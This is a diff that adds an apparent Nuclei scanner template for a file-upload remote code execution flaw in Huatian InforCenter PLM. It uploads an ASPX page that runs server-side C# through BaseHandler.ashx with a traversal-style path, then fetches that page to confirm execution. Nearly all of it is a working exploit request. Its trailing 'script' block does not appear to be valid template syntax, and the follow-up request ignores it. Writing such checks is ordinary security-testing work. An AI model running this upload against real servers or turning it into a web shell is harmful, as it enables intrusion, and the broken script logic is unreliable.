@@ -1,0 +1,66 @@
+id: huatian-inforcenter-plm-uploadfile-rce
+
+info:
+  name: Huatian InforCenter PLM File Upload RCE
+  author: security-researcher
+  severity: critical
+  description: Arbitrary file upload vulnerability in uploadFileToIIS interface leading to RCE
+  tags: plm,huatian,file-upload,rce,aspx
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/"
+
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      ------WebKitFormBoundary{{randstr}}
+      Content-Disposition: form-data; name="file"; filename="test_{{randstr}}.aspx"
+      Content-Type: text/plain
+
+      <%@ Page Language="C#" %>
+      <%
+      Response.Write("NUCLEI_RCE_TEST_{{randstr}}");
+      %>
+      ------WebKitFormBoundary{{randstr}}--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "id")'
+          - 'contains(body, ".aspx")'
+          - 'contains(body, "src")'
+        condition: and
+
+    extractors:
+      - type: json
+        name: file_id
+        part: body
+        internal: true
+        json:
+          - '.[0].id'
+      - type: json
+        name: file_path
+        part: body
+        internal: true
+        json:
+          - '.[0].src'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{file_path}}"  # 使用 file_path 而不是 cleanedPath
+
+    matchers:
+      - type: word
+        words:
+          - "NUCLEI_RCE_TEST_{{randstr}}"
+        condition: and
+
+    script: |
+      {{- $path := .file_path }}  # 获取提取的路径
+      {{- $cleanedPath := replace $path ".." "" }}  # 替换路径中的 .. 部分
+      {{- return $cleanedPath }}  # 返回清理后的路径
